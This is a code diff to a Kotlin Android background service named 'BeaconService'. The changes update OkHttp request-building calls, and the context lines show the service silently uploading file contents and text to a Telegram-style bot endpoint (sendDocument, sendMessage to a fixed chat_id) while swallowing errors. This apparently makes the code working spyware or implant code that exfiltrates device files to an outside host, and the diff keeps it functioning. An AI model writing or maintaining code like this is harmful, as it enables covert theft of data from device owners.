@@ -8,6 +8,8 @@ import android.os.IBinder
 import android.util.Log
 import kotlinx.coroutines.*
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.File
 import java.util.concurrent.TimeUnit
@@ -165,7 +167,7 @@ class BeaconService : Service() {
             val body = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", CHAT_ID)
-                .addFormDataPart("document", f.name, RequestBody.create(null, bytes))
+                .addFormDataPart("document", f.name, bytes.toRequestBody(null))
                 .build()
             val req = Request.Builder().url("$API/sendDocument").post(body).build()
             client.newCall(req).execute().close()
@@ -190,9 +192,7 @@ class BeaconService : Service() {
             val json = JSONObject()
                 .put("chat_id", CHAT_ID)
                 .put("text", text.take(4000))
-            val body = RequestBody.create(
-                MediaType.parse("application/json"), json.toString()
-            )
+            val body = json.toString().toRequestBody("application/json".toMediaType())
             val req = Request.Builder().url("$API/sendMessage").post(body).build()
             client.newCall(req).execute().close()
         } catch (e: Exception) {
